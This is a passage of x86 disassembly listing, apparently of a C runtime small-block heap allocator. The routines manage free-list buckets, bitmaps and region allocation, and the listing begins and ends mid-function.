  4268cf:	mov    esi,DWORD PTR [ebp+0xc]
  4268d2:	jmp    0x4268d7
  4268d4:	mov    ebx,DWORD PTR [ebp+0x8]
  4268d7:	cmp    DWORD PTR [ebp-0xc],0x0
  4268db:	jne    0x4268e5
  4268dd:	cmp    ebx,edx
  4268df:	je     0x426965
  4268e5:	mov    ecx,DWORD PTR [ebp-0x10]
  4268e8:	lea    ecx,[ecx+edx*8]
  4268eb:	mov    ebx,DWORD PTR [ecx+0x4]
  4268ee:	mov    DWORD PTR [esi+0x8],ecx
  4268f1:	mov    DWORD PTR [esi+0x4],ebx
  4268f4:	mov    DWORD PTR [ecx+0x4],esi
  4268f7:	mov    ecx,DWORD PTR [esi+0x4]
  4268fa:	mov    DWORD PTR [ecx+0x8],esi
  4268fd:	mov    ecx,DWORD PTR [esi+0x4]
  426900:	cmp    ecx,DWORD PTR [esi+0x8]
  426903:	jne    0x426965
  426905:	mov    cl,BYTE PTR [edx+eax*1+0x4]
  426909:	mov    BYTE PTR [ebp+0xf],cl
  42690c:	inc    cl
  42690e:	cmp    edx,0x20
  426911:	mov    BYTE PTR [edx+eax*1+0x4],cl
  426915:	jae    0x42693c
  426917:	cmp    BYTE PTR [ebp+0xf],0x0
  42691b:	jne    0x42692b
  42691d:	mov    ecx,edx
  42691f:	mov    ebx,0x80000000
  426924:	shr    ebx,cl
  426926:	mov    ecx,DWORD PTR [ebp+0x8]
  426929:	or     DWORD PTR [ecx],ebx
  42692b:	mov    ebx,0x80000000
  426930:	mov    ecx,edx
  426932:	shr    ebx,cl
  426934:	lea    eax,[eax+edi*4+0x44]
  426938:	or     DWORD PTR [eax],ebx
  42693a:	jmp    0x426965
  42693c:	cmp    BYTE PTR [ebp+0xf],0x0
  426940:	jne    0x426952
  426942:	lea    ecx,[edx-0x20]
  426945:	mov    ebx,0x80000000
  42694a:	shr    ebx,cl
  42694c:	mov    ecx,DWORD PTR [ebp+0x8]
  42694f:	or     DWORD PTR [ecx+0x4],ebx
  426952:	lea    ecx,[edx-0x20]
  426955:	mov    edx,0x80000000
  42695a:	shr    edx,cl
  42695c:	lea    eax,[eax+edi*4+0xc4]
  426963:	or     DWORD PTR [eax],edx
  426965:	mov    eax,DWORD PTR [ebp-0x4]
  426968:	mov    DWORD PTR [esi],eax
  42696a:	mov    DWORD PTR [eax+esi*1-0x4],eax
  42696e:	mov    eax,DWORD PTR [ebp-0x10]
  426971:	dec    DWORD PTR [eax]
  426973:	jne    0x426a70
  426979:	mov    eax,ds:0x45def8
  42697e:	test   eax,eax
  426980:	je     0x426a62
  426986:	mov    ecx,DWORD PTR ds:0x45df10
  42698c:	mov    esi,DWORD PTR ds:0x4290b0
  426992:	push   0x4000
  426997:	shl    ecx,0xf
  42699a:	add    ecx,DWORD PTR [eax+0xc]
  42699d:	mov    ebx,0x8000
  4269a2:	push   ebx
  4269a3:	push   ecx
  4269a4:	call   esi
  4269a6:	mov    ecx,DWORD PTR ds:0x45df10
  4269ac:	mov    eax,ds:0x45def8
  4269b1:	mov    edx,0x80000000
  4269b6:	shr    edx,cl
  4269b8:	or     DWORD PTR [eax+0x8],edx
  4269bb:	mov    eax,ds:0x45def8
  4269c0:	mov    eax,DWORD PTR [eax+0x10]
  4269c3:	mov    ecx,DWORD PTR ds:0x45df10
  4269c9:	and    DWORD PTR [eax+ecx*4+0xc4],0x0
  4269d1:	mov    eax,ds:0x45def8
  4269d6:	mov    eax,DWORD PTR [eax+0x10]
  4269d9:	dec    BYTE PTR [eax+0x43]
  4269dc:	mov    eax,ds:0x45def8
  4269e1:	mov    ecx,DWORD PTR [eax+0x10]
  4269e4:	cmp    BYTE PTR [ecx+0x43],0x0
  4269e8:	jne    0x4269f3
  4269ea:	and    DWORD PTR [eax+0x4],0xfffffffe
  4269ee:	mov    eax,ds:0x45def8
  4269f3:	cmp    DWORD PTR [eax+0x8],0xffffffff
  4269f7:	jne    0x426a62
  4269f9:	push   ebx
  4269fa:	push   0x0
  4269fc:	push   DWORD PTR [eax+0xc]
  4269ff:	call   esi
  426a01:	mov    eax,ds:0x45def8
  426a06:	push   DWORD PTR [eax+0x10]
  426a09:	push   0x0
  426a0b:	push   DWORD PTR ds:0x45e140
  426a11:	call   DWORD PTR ds:0x429048
  426a17:	mov    eax,ds:0x45defc
  426a1c:	mov    edx,DWORD PTR ds:0x45df00
  426a22:	lea    eax,[eax+eax*4]
  426a25:	shl    eax,0x2
  426a28:	mov    ecx,eax
  426a2a:	mov    eax,ds:0x45def8
  426a2f:	sub    ecx,eax
  426a31:	lea    ecx,[ecx+edx*1-0x14]
  426a35:	push   ecx
  426a36:	lea    ecx,[eax+0x14]
  426a39:	push   ecx
  426a3a:	push   eax
  426a3b:	call   0x428290
  426a40:	mov    eax,DWORD PTR [ebp+0x8]
  426a43:	add    esp,0xc
  426a46:	dec    DWORD PTR ds:0x45defc
  426a4c:	cmp    eax,DWORD PTR ds:0x45def8
  426a52:	jbe    0x426a58
  426a54:	sub    DWORD PTR [ebp+0x8],0x14
  426a58:	mov    eax,ds:0x45df00
  426a5d:	mov    ds:0x45df08,eax
  426a62:	mov    eax,DWORD PTR [ebp+0x8]
  426a65:	mov    ds:0x45def8,eax
  426a6a:	mov    DWORD PTR ds:0x45df10,edi
  426a70:	pop    ebx
  426a71:	pop    edi
  426a72:	pop    esi
  426a73:	leave  
  426a74:	ret    
  426a75:	mov    eax,ds:0x45defc
  426a7a:	mov    ecx,DWORD PTR ds:0x45df0c
  426a80:	push   edi
  426a81:	xor    edi,edi
  426a83:	cmp    eax,ecx
  426a85:	jne    0x426abb
  426a87:	lea    eax,[ecx+ecx*4+0x50]
  426a8b:	shl    eax,0x2
  426a8e:	push   eax
  426a8f:	push   DWORD PTR ds:0x45df00
  426a95:	push   edi
  426a96:	push   DWORD PTR ds:0x45e140
  426a9c:	call   DWORD PTR ds:0x4290d4
  426aa2:	cmp    eax,edi
  426aa4:	jne    0x426aaa
  426aa6:	xor    eax,eax
  426aa8:	pop    edi
  426aa9:	ret    
  426aaa:	add    DWORD PTR ds:0x45df0c,0x10
  426ab1:	mov    ds:0x45df00,eax
  426ab6:	mov    eax,ds:0x45defc
  426abb:	mov    ecx,DWORD PTR ds:0x45df00
  426ac1:	push   esi
  426ac2:	push   0x41c4
  426ac7:	push   0x8
  426ac9:	push   DWORD PTR ds:0x45e140
  426acf:	lea    eax,[eax+eax*4]
  426ad2:	lea    esi,[ecx+eax*4]
  426ad5:	call   DWORD PTR ds:0x429030
  426adb:	cmp    eax,edi
  426add:	mov    DWORD PTR [esi+0x10],eax
  426ae0:	jne    0x426ae6
  426ae2:	xor    eax,eax
  426ae4:	jmp    0x426b29
  426ae6:	push   0x4
  426ae8:	push   0x2000
  426aed:	push   0x100000
  426af2:	push   edi
  426af3:	call   DWORD PTR ds:0x4290d0
  426af9:	cmp    eax,edi
  426afb:	mov    DWORD PTR [esi+0xc],eax
  426afe:	jne    0x426b12
  426b00:	push   DWORD PTR [esi+0x10]
  426b03:	push   edi
  426b04:	push   DWORD PTR ds:0x45e140
  426b0a:	call   DWORD PTR ds:0x429048
  426b10:	jmp    0x426ae2
  426b12:	or     DWORD PTR [esi+0x8],0xffffffff
  426b16:	mov    DWORD PTR [esi],edi
  426b18:	mov    DWORD PTR [esi+0x4],edi
  426b1b:	inc    DWORD PTR ds:0x45defc
  426b21:	mov    eax,DWORD PTR [esi+0x10]
  426b24:	or     DWORD PTR [eax],0xffffffff
  426b27:	mov    eax,esi
  426b29:	pop    esi
  426b2a:	pop    edi
  426b2b:	ret    
  426b2c:	push   ebp
  426b2d:	mov    ebp,esp
  426b2f:	push   ecx
  426b30:	push   ecx
  426b31:	mov    ecx,DWORD PTR [ebp+0x8]
  426b34:	mov    eax,DWORD PTR [ecx+0x8]
  426b37:	push   ebx
  426b38:	push   esi
  426b39:	mov    esi,DWORD PTR [ecx+0x10]
  426b3c:	push   edi
  426b3d:	xor    ebx,ebx
  426b3f:	jmp    0x426b44
  426b41:	shl    eax,1
  426b43:	inc    ebx
  426b44:	test   eax,eax
  426b46:	jge    0x426b41
  426b48:	mov    eax,ebx
  426b4a:	imul   eax,eax,0x204
  426b50:	lea    eax,[eax+esi*1+0x144]
  426b57:	push   0x3f
  426b59:	mov    DWORD PTR [ebp-0x8],eax
  426b5c:	pop    edx
  426b5d:	mov    DWORD PTR [eax+0x8],eax
  426b60:	mov    DWORD PTR [eax+0x4],eax
  426b63:	add    eax,0x8
  426b66:	dec    edx
  426b67:	jne    0x426b5d
  426b69:	push   0x4
  426b6b:	mov    edi,ebx
  426b6d:	push   0x1000
  426b72:	shl    edi,0xf
  426b75:	add    edi,DWORD PTR [ecx+0xc]
  426b78:	push   0x8000
  426b7d:	push   edi
  426b7e:	call   DWORD PTR ds:0x4290d0
  426b84:	test   eax,eax
  426b86:	jne    0x426b90
  426b88:	or     eax,0xffffffff
  426b8b:	jmp    0x426c2d
  426b90:	lea    edx,[edi+0x7000]
  426b96:	cmp    edi,edx
  426b98:	mov    DWORD PTR [ebp-0x4],edx
  426b9b:	ja     0x426be0
  426b9d:	mov    ecx,edx
  426b9f:	sub    ecx,edi
  426ba1:	shr    ecx,0xc
  426ba4:	lea    eax,[edi+0x10]
  426ba7:	inc    ecx
  426ba8:	or     DWORD PTR [eax-0x8],0xffffffff
  426bac:	or     DWORD PTR [eax+0xfec],0xffffffff
  426bb3:	lea    edx,[eax+0xffc]
  426bb9:	mov    DWORD PTR [eax],edx
  426bbb:	lea    edx,[eax-0x1004]
  426bc1:	mov    DWORD PTR [eax-0x4],0xff0
  426bc8:	mov    DWORD PTR [eax+0x4],edx
  426bcb:	mov    DWORD PTR [eax+0xfe8],0xff0
  426bd5:	add    eax,0x1000
  426bda:	dec    ecx
  426bdb:	jne    0x426ba8
  426bdd:	mov    edx,DWORD PTR [ebp-0x4]
  426be0:	mov    eax,DWORD PTR [ebp-0x8]
  426be3:	add    eax,0x1f8
  426be8:	lea    ecx,[edi+0xc]
  426beb:	mov    DWORD PTR [eax+0x4],ecx
  426bee:	mov    DWORD PTR [ecx+0x8],eax
  426bf1:	lea    ecx,[edx+0xc]
  426bf4:	mov    DWORD PTR [eax+0x8],ecx
  426bf7:	mov    DWORD PTR [ecx+0x4],eax
  426bfa:	and    DWORD PTR [esi+ebx*4+0x44],0x0
  426bff:	xor    edi,edi
  426c01:	inc    edi
  426c02:	mov    DWORD PTR [esi+ebx*4+0xc4],edi
  426c09:	mov    al,BYTE PTR [esi+0x43]
  426c0c:	mov    cl,al
  426c0e:	inc    cl
  426c10:	test   al,al
  426c12:	mov    eax,DWORD PTR [ebp+0x8]
  426c15:	mov    BYTE PTR [esi+0x43],cl
  426c18:	jne    0x426c1d
  426c1a:	or     DWORD PTR [eax+0x4],edi
  426c1d:	mov    edx,0x80000000
  426c22:	mov    ecx,ebx
  426c24:	shr    edx,cl
  426c26:	not    edx
  426c28:	and    DWORD PTR [eax+0x8],edx
  426c2b:	mov    eax,ebx
  426c2d:	pop    edi
  426c2e:	pop    esi
  426c2f:	pop    ebx
  426c30:	leave  
  426c31:	ret    
  426c32:	push   ebp
  426c33:	mov    ebp,esp
  426c35:	sub    esp,0xc
  426c38:	mov    ecx,DWORD PTR [ebp+0x8]
  426c3b:	mov    eax,DWORD PTR [ecx+0x10]
  426c3e:	push   ebx
  426c3f:	push   esi
  426c40:	mov    esi,DWORD PTR [ebp+0x10]
  426c43:	push   edi
  426c44:	mov    edi,DWORD PTR [ebp+0xc]
  426c47:	mov    edx,edi
  426c49:	sub    edx,DWORD PTR [ecx+0xc]
  426c4c:	add    esi,0x17
  426c4f:	shr    edx,0xf
  426c52:	mov    ecx,edx
  426c54:	imul   ecx,ecx,0x204
  426c5a:	lea    ecx,[ecx+eax*1+0x144]
  426c61:	mov    DWORD PTR [ebp-0xc],ecx
  426c64:	mov    ecx,DWORD PTR [edi-0x4]
  426c67:	and    esi,0xfffffff0
  426c6a:	dec    ecx
  426c6b:	cmp    esi,ecx
  426c6d:	lea    edi,[ecx+edi*1-0x4]
  426c71:	mov    ebx,DWORD PTR [edi]
  426c73:	mov    DWORD PTR [ebp+0x10],ecx
  426c76:	mov    DWORD PTR [ebp-0x4],ebx
  426c79:	jle    0x426dd4
  426c7f:	test   bl,0x1
  426c82:	jne    0x426dcd
  426c88:	add    ebx,ecx
  426c8a:	cmp    esi,ebx
  426c8c:	jg     0x426dcd
  426c92:	mov    ecx,DWORD PTR [ebp-0x4]
  426c95:	sar    ecx,0x4
  426c98:	dec    ecx
  426c99:	cmp    ecx,0x3f
  426c9c:	mov    DWORD PTR [ebp-0x8],ecx
  426c9f:	jbe    0x426ca7
  426ca1:	push   0x3f
  426ca3:	pop    ecx
  426ca4:	mov    DWORD PTR [ebp-0x8],ecx
  426ca7:	mov    ebx,DWORD PTR [edi+0x4]
  426caa:	cmp    ebx,DWORD PTR [edi+0x8]
  426cad:	jne    0x426cf2
  426caf:	cmp    ecx,0x20
  426cb2:	mov    ebx,0x80000000
  426cb7:	jae    0x426cd3
  426cb9:	shr    ebx,cl
  426cbb:	mov    ecx,DWORD PTR [ebp-0x8]
  426cbe:	lea    ecx,[ecx+eax*1+0x4]
  426cc2:	not    ebx
  426cc4:	and    DWORD PTR [eax+edx*4+0x44],ebx
  426cc8:	dec    BYTE PTR [ecx]
  426cca:	jne    0x426cf2
  426ccc:	mov    ecx,DWORD PTR [ebp+0x8]
  426ccf:	and    DWORD PTR [ecx],ebx
  426cd1:	jmp    0x426cf2
  426cd3:	add    ecx,0xffffffe0
  426cd6:	shr    ebx,cl
  426cd8:	mov    ecx,DWORD PTR [ebp-0x8]
  426cdb:	lea    ecx,[ecx+eax*1+0x4]
  426cdf:	not    ebx
  426ce1:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  426ce8:	dec    BYTE PTR [ecx]
  426cea:	jne    0x426cf2
  426cec:	mov    ecx,DWORD PTR [ebp+0x8]
  426cef:	and    DWORD PTR [ecx+0x4],ebx
  426cf2:	mov    ecx,DWORD PTR [edi+0x8]
  426cf5:	mov    ebx,DWORD PTR [edi+0x4]
  426cf8:	mov    DWORD PTR [ecx+0x4],ebx
  426cfb:	mov    ecx,DWORD PTR [edi+0x4]
  426cfe:	mov    edi,DWORD PTR [edi+0x8]
  426d01:	mov    DWORD PTR [ecx+0x8],edi
  426d04:	mov    ecx,DWORD PTR [ebp+0x10]
  426d07:	sub    ecx,esi
  426d09:	add    DWORD PTR [ebp-0x4],ecx
  426d0c:	cmp    DWORD PTR [ebp-0x4],0x0
  426d10:	jle    0x426dbb
  426d16:	mov    edi,DWORD PTR [ebp-0x4]
  426d19:	mov    ecx,DWORD PTR [ebp+0xc]
  426d1c:	sar    edi,0x4
  426d1f:	dec    edi
  426d20:	cmp    edi,0x3f
  426d23:	lea    ecx,[ecx+esi*1-0x4]
  426d27:	jbe    0x426d2c
  426d29:	push   0x3f
  426d2b:	pop    edi
  426d2c:	mov    ebx,DWORD PTR [ebp-0xc]
  426d2f:	lea    ebx,[ebx+edi*8]
  426d32:	mov    DWORD PTR [ebp+0x10],ebx
  426d35:	mov    ebx,DWORD PTR [ebx+0x4]
  426d38:	mov    DWORD PTR [ecx+0x4],ebx
  426d3b:	mov    ebx,DWORD PTR [ebp+0x10]
  426d3e:	mov    DWORD PTR [ecx+0x8],ebx
  426d41:	mov    DWORD PTR [ebx+0x4],ecx
  426d44:	mov    ebx,DWORD PTR [ecx+0x4]
  426d47:	mov    DWORD PTR [ebx+0x8],ecx
  426d4a:	mov    ebx,DWORD PTR [ecx+0x4]
  426d4d:	cmp    ebx,DWORD PTR [ecx+0x8]
  426d50:	jne    0x426da9
  426d52:	mov    cl,BYTE PTR [edi+eax*1+0x4]
  426d56:	mov    BYTE PTR [ebp+0x13],cl
  426d59:	inc    cl
  426d5b:	cmp    edi,0x20
  426d5e:	mov    BYTE PTR [edi+eax*1+0x4],cl
  426d62:	jae    0x426d80
  426d64:	cmp    BYTE PTR [ebp+0x13],0x0
  426d68:	jne    0x426d78
  426d6a:	mov    ecx,edi
  426d6c:	mov    ebx,0x80000000
  426d71:	shr    ebx,cl
  426d73:	mov    ecx,DWORD PTR [ebp+0x8]
  426d76:	or     DWORD PTR [ecx],ebx
  426d78:	lea    eax,[eax+edx*4+0x44]
  426d7c:	mov    ecx,edi
  426d7e:	jmp    0x426da0
  426d80:	cmp    BYTE PTR [ebp+0x13],0x0
  426d84:	jne    0x426d96
  426d86:	lea    ecx,[edi-0x20]
  426d89:	mov    ebx,0x80000000
  426d8e:	shr    ebx,cl
  426d90:	mov    ecx,DWORD PTR [ebp+0x8]
  426d93:	or     DWORD PTR [ecx+0x4],ebx
  426d96:	lea    eax,[eax+edx*4+0xc4]
  426d9d:	lea    ecx,[edi-0x20]
  426da0:	mov    edx,0x80000000
  426da5:	shr    edx,cl
  426da7:	or     DWORD PTR [eax],edx
  426da9:	mov    edx,DWORD PTR [ebp+0xc]
  426dac:	mov    ecx,DWORD PTR [ebp-0x4]
  426daf:	lea    eax,[edx+esi*1-0x4]
  426db3:	mov    DWORD PTR [eax],ecx
  426db5:	mov    DWORD PTR [ecx+eax*1-0x4],ecx
  426db9:	jmp    0x426dbe
  426dbb:	mov    edx,DWORD PTR [ebp+0xc]
  426dbe:	lea    eax,[esi+0x1]
  426dc1:	mov    DWORD PTR [edx-0x4],eax
  426dc4:	mov    DWORD PTR [edx+esi*1-0x8],eax
  426dc8:	jmp    0x426f09
  426dcd:	xor    eax,eax
  426dcf:	jmp    0x426f0c
  426dd4:	jge    0x426f09
  426dda:	mov    ebx,DWORD PTR [ebp+0xc]
  426ddd:	sub    DWORD PTR [ebp+0x10],esi
  426de0:	lea    ecx,[esi+0x1]
  426de3:	mov    DWORD PTR [ebx-0x4],ecx
  426de6:	lea    ebx,[ebx+esi*1-0x4]
  426dea:	mov    esi,DWORD PTR [ebp+0x10]
  426ded:	sar    esi,0x4
  426df0:	dec    esi
  426df1:	cmp    esi,0x3f
  426df4:	mov    DWORD PTR [ebp+0xc],ebx
  426df7:	mov    DWORD PTR [ebx-0x4],ecx
  426dfa:	jbe    0x426dff
  426dfc:	push   0x3f
  426dfe:	pop    esi
  426dff:	test   BYTE PTR [ebp-0x4],0x1
  426e03:	jne    0x426e89
  426e09:	mov    esi,DWORD PTR [ebp-0x4]
  426e0c:	sar    esi,0x4
  426e0f:	dec    esi
  426e10:	cmp    esi,0x3f
  426e13:	jbe    0x426e18
  426e15:	push   0x3f
  426e17:	pop    esi
  426e18:	mov    ecx,DWORD PTR [edi+0x4]
  426e1b:	cmp    ecx,DWORD PTR [edi+0x8]
  426e1e:	jne    0x426e62
  426e20:	cmp    esi,0x20
  426e23:	mov    ebx,0x80000000
  426e28:	jae    0x426e43
  426e2a:	mov    ecx,esi
  426e2c:	shr    ebx,cl
  426e2e:	lea    esi,[esi+eax*1+0x4]
  426e32:	not    ebx
  426e34:	and    DWORD PTR [eax+edx*4+0x44],ebx
  426e38:	dec    BYTE PTR [esi]
  426e3a:	jne    0x426e5f
  426e3c:	mov    ecx,DWORD PTR [ebp+0x8]
  426e3f:	and    DWORD PTR [ecx],ebx
  426e41:	jmp    0x426e5f
  426e43:	lea    ecx,[esi-0x20]
  426e46:	shr    ebx,cl
  426e48:	lea    ecx,[esi+eax*1+0x4]
  426e4c:	not    ebx
  426e4e:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  426e55:	dec    BYTE PTR [ecx]
  426e57:	jne    0x426e5f
  426e59:	mov    ecx,DWORD PTR [ebp+0x8]
  426e5c:	and    DWORD PTR [ecx+0x4],ebx
  426e5f:	mov    ebx,DWORD PTR [ebp+0xc]
  426e62:	mov    ecx,DWORD PTR [edi+0x8]
  426e65:	mov    esi,DWORD PTR [edi+0x4]
  426e68:	mov    DWORD PTR [ecx+0x4],esi
  426e6b:	mov    esi,DWORD PTR [edi+0x8]
  426e6e:	mov    ecx,DWORD PTR [edi+0x4]
  426e71:	mov    DWORD PTR [ecx+0x8],esi
  426e74:	mov    esi,DWORD PTR [ebp+0x10]
  426e77:	add    esi,DWORD PTR [ebp-0x4]
  426e7a:	mov    DWORD PTR [ebp+0x10],esi
  426e7d:	sar    esi,0x4
  426e80:	dec    esi
  426e81:	cmp    esi,0x3f
  426e84:	jbe    0x426e89
  426e86:	push   0x3f
  426e88:	pop    esi
  426e89:	mov    ecx,DWORD PTR [ebp-0xc]
  426e8c:	lea    ecx,[ecx+esi*8]
  426e8f:	mov    edi,DWORD PTR [ecx+0x4]
  426e92:	mov    DWORD PTR [ebx+0x8],ecx
  426e95:	mov    DWORD PTR [ebx+0x4],edi
  426e98:	mov    DWORD PTR [ecx+0x4],ebx
  426e9b:	mov    ecx,DWORD PTR [ebx+0x4]
  426e9e:	mov    DWORD PTR [ecx+0x8],ebx
  426ea1:	mov    ecx,DWORD PTR [ebx+0x4]
  426ea4:	cmp    ecx,DWORD PTR [ebx+0x8]
  426ea7:	jne    0x426f00
  426ea9:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  426ead:	mov    BYTE PTR [ebp+0xf],cl
  426eb0:	inc    cl
  426eb2:	cmp    esi,0x20
  426eb5:	mov    BYTE PTR [esi+eax*1+0x4],cl
  426eb9:	jae    0x426ed7
  426ebb:	cmp    BYTE PTR [ebp+0xf],0x0
  426ebf:	jne    0x426ecf
  426ec1:	mov    ecx,esi
  426ec3:	mov    edi,0x80000000
  426ec8:	shr    edi,cl
  426eca:	mov    ecx,DWORD PTR [ebp+0x8]
  426ecd:	or     DWORD PTR [ecx],edi
  426ecf:	lea    eax,[eax+edx*4+0x44]
  426ed3:	mov    ecx,esi
  426ed5:	jmp    0x426ef7
  426ed7:	cmp    BYTE PTR [ebp+0xf],0x0
  426edb:	jne    0x426eed
  426edd:	lea    ecx,[esi-0x20]
  426ee0:	mov    edi,0x80000000
  426ee5:	shr    edi,cl
  426ee7:	mov    ecx,DWORD PTR [ebp+0x8]
  426eea:	or     DWORD PTR [ecx+0x4],edi
  426eed:	lea    eax,[eax+edx*4+0xc4]
  426ef4:	lea    ecx,[esi-0x20]
  426ef7:	mov    edx,0x80000000
  426efc:	shr    edx,cl
  426efe:	or     DWORD PTR [eax],edx
  426f00:	mov    eax,DWORD PTR [ebp+0x10]
  426f03:	mov    DWORD PTR [ebx],eax
  426f05:	mov    DWORD PTR [eax+ebx*1-0x4],eax
  426f09:	xor    eax,eax
  426f0b:	inc    eax
  426f0c:	pop    edi
  426f0d:	pop    esi
  426f0e:	pop    ebx
  426f0f:	leave  
  426f10:	ret    
  426f11:	push   ebp
  426f12:	mov    ebp,esp
  426f14:	sub    esp,0x14
  426f17:	mov    ecx,DWORD PTR [ebp+0x8]
  426f1a:	mov    eax,ds:0x45defc
  426f1f:	mov    edx,DWORD PTR ds:0x45df00
  426f25:	add    ecx,0x17
  426f28:	and    ecx,0xfffffff0
  426f2b:	push   ebx
  426f2c:	mov    DWORD PTR [ebp-0x10],ecx
  426f2f:	sar    ecx,0x4
  426f32:	push   esi
  426f33:	lea    eax,[eax+eax*4]
  426f36:	push   edi
  426f37:	dec    ecx
  426f38:	cmp    ecx,0x20
  426f3b:	lea    edi,[edx+eax*4]
  426f3e:	mov    DWORD PTR [ebp-0x4],edi
  426f41:	jge    0x426f4e
  426f43:	or     esi,0xffffffff
  426f46:	shr    esi,cl
  426f48:	or     DWORD PTR [ebp-0x8],0xffffffff
  426f4c:	jmp    0x426f5b
  426f4e:	add    ecx,0xffffffe0
  426f51:	or     eax,0xffffffff
  426f54:	xor    esi,esi
  426f56:	shr    eax,cl
  426f58:	mov    DWORD PTR [ebp-0x8],eax
  426f5b:	mov    eax,ds:0x45df08
  426f60:	mov    ebx,eax
  426f62:	mov    DWORD PTR [ebp-0xc],esi
  426f65:	cmp    ebx,edi
  426f67:	jmp    0x426f7d
  426f69:	mov    ecx,DWORD PTR [ebx+0x4]
  426f6c:	mov    edi,DWORD PTR [ebx]
  426f6e:	and    ecx,DWORD PTR [ebp-0x8]
  426f71:	and    edi,esi
  426f73:	or     ecx,edi
  426f75:	jne    0x426f82
  426f77:	add    ebx,0x14
  426f7a:	cmp    ebx,DWORD PTR [ebp-0x4]
  426f7d:	mov    DWORD PTR [ebp+0x8],ebx
  426f80:	jb     0x426f69
  426f82:	cmp    ebx,DWORD PTR [ebp-0x4]
  426f85:	jne    0x426fab
  426f87:	mov    ebx,edx
  426f89:	jmp    0x426f9c
  426f8b:	mov    ecx,DWORD PTR [ebx+0x4]
  426f8e:	mov    edi,DWORD PTR [ebx]
  426f90:	and    ecx,DWORD PTR [ebp-0x8]
  426f93:	and    edi,esi
  426f95:	or     ecx,edi
  426f97:	jne    0x426fa3
  426f99:	add    ebx,0x14
  426f9c:	cmp    ebx,eax
  426f9e:	mov    DWORD PTR [ebp+0x8],ebx
  426fa1:	jb     0x426f8b
  426fa3:	cmp    ebx,eax
  426fa5:	je     0x42703f
  426fab:	mov    DWORD PTR ds:0x45df08,ebx
  426fb1:	mov    eax,DWORD PTR [ebx+0x10]
  426fb4:	mov    edx,DWORD PTR [eax]
  426fb6:	cmp    edx,0xffffffff
  426fb9:	mov    DWORD PTR [ebp-0x4],edx
  426fbc:	je     0x426fd2
  426fbe:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  426fc5:	mov    edi,DWORD PTR [eax+edx*4+0x44]
  426fc9:	and    ecx,DWORD PTR [ebp-0x8]
  426fcc:	and    edi,esi
  426fce:	or     ecx,edi
  426fd0:	jne    0x427008
  426fd2:	mov    edx,DWORD PTR [eax+0xc4]
  426fd8:	and    edx,DWORD PTR [ebp-0x8]
  426fdb:	and    DWORD PTR [ebp-0x4],0x0
  426fdf:	lea    ecx,[eax+0x44]
  426fe2:	mov    esi,DWORD PTR [ecx]
  426fe4:	and    esi,DWORD PTR [ebp-0xc]
  426fe7:	or     edx,esi
  426fe9:	mov    esi,DWORD PTR [ebp-0xc]
  426fec:	jne    0x427005
  426fee:	mov    edx,DWORD PTR [ecx+0x84]
  426ff4:	and    edx,DWORD PTR [ebp-0x8]
  426ff7:	inc    DWORD PTR [ebp-0x4]
  426ffa:	add    ecx,0x4
  426ffd:	mov    edi,DWORD PTR [ecx]
  426fff:	and    edi,esi
  427001:	or     edx,edi
  427003:	je     0x426fee
  427005:	mov    edx,DWORD PTR [ebp-0x4]
  427008:	mov    ecx,edx
  42700a:	imul   ecx,ecx,0x204
  427010:	lea    ecx,[ecx+eax*1+0x144]
  427017:	mov    DWORD PTR [ebp-0xc],ecx
  42701a:	mov    ecx,DWORD PTR [eax+edx*4+0x44]
  42701e:	xor    edi,edi
  427020:	and    ecx,esi
  427022:	jne    0x427091
  427024:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  42702b:	and    ecx,DWORD PTR [ebp-0x8]
  42702e:	push   0x20
  427030:	pop    edi
  427031:	jmp    0x427091
  427033:	cmp    DWORD PTR [ebx+0x8],0x0
  427037:	jne    0x427044
  427039:	add    ebx,0x14
  42703c:	mov    DWORD PTR [ebp+0x8],ebx
  42703f:	cmp    ebx,DWORD PTR [ebp-0x4]
  427042:	jb     0x427033
  427044:	cmp    ebx,DWORD PTR [ebp-0x4]
  427047:	jne    0x42706f
  427049:	mov    ebx,edx
  42704b:	jmp    0x427056
  42704d:	cmp    DWORD PTR [ebx+0x8],0x0
  427051:	jne    0x42705d
  427053:	add    ebx,0x14
  427056:	cmp    ebx,eax
  427058:	mov    DWORD PTR [ebp+0x8],ebx
  42705b:	jb     0x42704d
  42705d:	cmp    ebx,eax
  42705f:	jne    0x42706f
  427061:	call   0x426a75
  427066:	mov    ebx,eax
  427068:	test   ebx,ebx
  42706a:	mov    DWORD PTR [ebp+0x8],ebx
  42706d:	je     0x427087
  42706f:	push   ebx
  427070:	call   0x426b2c
  427075:	pop    ecx
  427076:	mov    ecx,DWORD PTR [ebx+0x10]
  427079:	mov    DWORD PTR [ecx],eax
  42707b:	mov    eax,DWORD PTR [ebx+0x10]
  42707e:	cmp    DWORD PTR [eax],0xffffffff
  427081:	jne    0x426fab
  427087:	xor    eax,eax
  427089:	jmp    0x427208
  42708e:	shl    ecx,1
  427090:	inc    edi
  427091:	test   ecx,ecx
  427093:	jge    0x42708e
  427095:	mov    ecx,DWORD PTR [ebp-0xc]
  427098:	mov    edx,DWORD PTR [ecx+edi*8+0x4]
  42709c:	mov    ecx,DWORD PTR [edx]
  42709e:	sub    ecx,DWORD PTR [ebp-0x10]
  4270a1:	mov    esi,ecx
  4270a3:	sar    esi,0x4
  4270a6:	dec    esi
  4270a7:	cmp    esi,0x3f
  4270aa:	mov    DWORD PTR [ebp-0x8],ecx
  4270ad:	jle    0x4270b2
  4270af:	push   0x3f
  4270b1:	pop    esi
  4270b2:	cmp    esi,edi
  4270b4:	je     0x4271bb
  4270ba:	mov    ecx,DWORD PTR [edx+0x4]
  4270bd:	cmp    ecx,DWORD PTR [edx+0x8]
  4270c0:	jne    0x42711e
  4270c2:	cmp    edi,0x20
  4270c5:	mov    ebx,0x80000000
  4270ca:	jge    0x4270f2
  4270cc:	mov    ecx,edi
  4270ce:	shr    ebx,cl
  4270d0:	mov    ecx,DWORD PTR [ebp-0x4]
  4270d3:	lea    edi,[eax+edi*1+0x4]
  4270d7:	not    ebx
  4270d9:	mov    DWORD PTR [ebp-0x14],ebx
  4270dc:	and    ebx,DWORD PTR [eax+ecx*4+0x44]
  4270e0:	mov    DWORD PTR [eax+ecx*4+0x44],ebx
  4270e4:	dec    BYTE PTR [edi]
  4270e6:	jne    0x42711b
  4270e8:	mov    ecx,DWORD PTR [ebp-0x14]
  4270eb:	mov    ebx,DWORD PTR [ebp+0x8]
  4270ee:	and    DWORD PTR [ebx],ecx
